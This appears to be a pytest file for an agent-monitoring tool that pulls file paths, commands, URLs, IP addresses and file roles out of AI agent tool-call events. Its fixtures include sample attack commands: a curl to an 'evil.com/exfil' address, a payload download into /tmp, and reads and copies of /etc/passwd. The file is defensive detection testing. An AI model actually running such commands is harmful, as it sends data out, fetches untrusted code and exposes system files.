"""Tests for event enrichment / extraction functions."""

from __future__ import annotations

import pytest

from agentsleak.engine.classifier import (
    CommandFileRef,
    extract_command_file_refs,
    extract_commands,
    extract_file_paths,
    extract_ip_addresses,
    extract_urls,
)

from .conftest import make_event


class TestExtractFilePaths:
    def test_extract_from_file_path_field(self):
        event = make_event(tool_name="Read", tool_input={"file_path": "/etc/passwd"})
        paths = extract_file_paths(event)
        assert "/etc/passwd" in paths

    def test_extract_from_path_field(self):
        event = make_event(tool_name="Glob", tool_input={"path": "/home/user"})
        paths = extract_file_paths(event)
        assert "/home/user" in paths

    def test_extract_from_command(self):
        event = make_event(
            tool_name="Bash",
            tool_input={"command": "cat /etc/passwd"},
        )
        paths = extract_file_paths(event)
        assert "/etc/passwd" in paths

    def test_extract_glob_pattern(self):
        event = make_event(tool_name="Glob", tool_input={"pattern": "**/*.py"})
        paths = extract_file_paths(event)
        assert "**/*.py" in paths

    def test_extract_notebook_path(self):
        event = make_event(
            tool_name="NotebookEdit",
            tool_input={"notebook_path": "/notebooks/test.ipynb"},
        )
        paths = extract_file_paths(event)
        assert "/notebooks/test.ipynb" in paths

    def test_deduplication(self):
        event = make_event(
            tool_name="Read",
            tool_input={"file_path": "/etc/hosts", "path": "/etc/hosts"},
        )
        paths = extract_file_paths(event)
        assert paths.count("/etc/hosts") == 1


class TestExtractCommands:
    def test_extract_from_command_field(self):
        event = make_event(tool_name="Bash", tool_input={"command": "whoami"})
        cmds = extract_commands(event)
        assert "whoami" in cmds

    def test_no_command_field(self):
        event = make_event(tool_name="Read", tool_input={"file_path": "/etc/passwd"})
        cmds = extract_commands(event)
        assert cmds == []


class TestExtractUrls:
    def test_extract_from_url_field(self):
        event = make_event(
            tool_name="WebFetch",
            tool_input={"url": "https://example.com/data"},
        )
        urls = extract_urls(event)
        assert "https://example.com/data" in urls

    def test_extract_from_command_curl(self):
        event = make_event(
            tool_name="Bash",
            tool_input={"command": "curl https://api.evil.com/exfil"},
        )
        urls = extract_urls(event)
        assert "https://api.evil.com/exfil" in urls

    def test_extract_from_command_wget(self):
        event = make_event(
            tool_name="Bash",
            tool_input={"command": "wget http://mirror.example.com/file.tar.gz"},
        )
        urls = extract_urls(event)
        assert "http://mirror.example.com/file.tar.gz" in urls

    def test_deduplication(self):
        event = make_event(
            tool_name="Bash",
            tool_input={"command": "curl https://example.com && curl https://example.com", "url": "https://example.com"},
        )
        urls = extract_urls(event)
        assert urls.count("https://example.com") == 1


class TestExtractIpAddresses:
    def test_extract_from_command(self):
        event = make_event(
            tool_name="Bash",
            tool_input={"command": "ping 10.0.0.1"},
        )
        ips = extract_ip_addresses(event)
        assert "10.0.0.1" in ips

    def test_extract_from_url(self):
        event = make_event(
            tool_name="WebFetch",
            tool_input={"url": "http://192.168.1.100:8080/api"},
        )
        ips = extract_ip_addresses(event)
        assert "192.168.1.100" in ips

    def test_no_ip(self):
        event = make_event(
            tool_name="Bash",
            tool_input={"command": "echo hello"},
        )
        ips = extract_ip_addresses(event)
        assert ips == []


class TestExtractCommandFileRefs:
    def test_curl_output(self):
        refs = extract_command_file_refs("curl -o /tmp/payload.sh https://evil.com/p")
        writes = [r for r in refs if r.role == "writes"]
        assert any(r.path == "/tmp/payload.sh" for r in writes)

    def test_shell_redirect(self):
        refs = extract_command_file_refs("echo data > /tmp/out.txt")
        writes = [r for r in refs if r.role == "writes"]
        assert any(r.path == "/tmp/out.txt" for r in writes)

    def test_cat_read(self):
        refs = extract_command_file_refs("cat /etc/passwd")
        reads = [r for r in refs if r.role == "reads"]
        assert any(r.path == "/etc/passwd" for r in reads)

    def test_bash_execute(self):
        refs = extract_command_file_refs("bash /tmp/script.sh")
        execs = [r for r in refs if r.role == "executes"]
        assert any(r.path == "/tmp/script.sh" for r in execs)

    def test_cp_read_and_write(self):
        refs = extract_command_file_refs("cp /etc/passwd /tmp/passwd_copy")
        reads = [r for r in refs if r.role == "reads"]
        writes = [r for r in refs if r.role == "writes"]
        assert any(r.path == "/etc/passwd" for r in reads)
        assert any(r.path == "/tmp/passwd_copy" for r in writes)

    def test_chmod_plus_x(self):
        refs = extract_command_file_refs("chmod +x ./deploy.sh")
        execs = [r for r in refs if r.role == "executes"]
        assert any(r.path == "./deploy.sh" for r in execs)

    def test_tee_write(self):
        refs = extract_command_file_refs("echo data | tee /tmp/log.txt")
        writes = [r for r in refs if r.role == "writes"]
        assert any(r.path == "/tmp/log.txt" for r in writes)

    def test_input_redirect_read(self):
        refs = extract_command_file_refs("wc -l < /tmp/data.csv")
        reads = [r for r in refs if r.role == "reads"]
        assert any(r.path == "/tmp/data.csv" for r in reads)
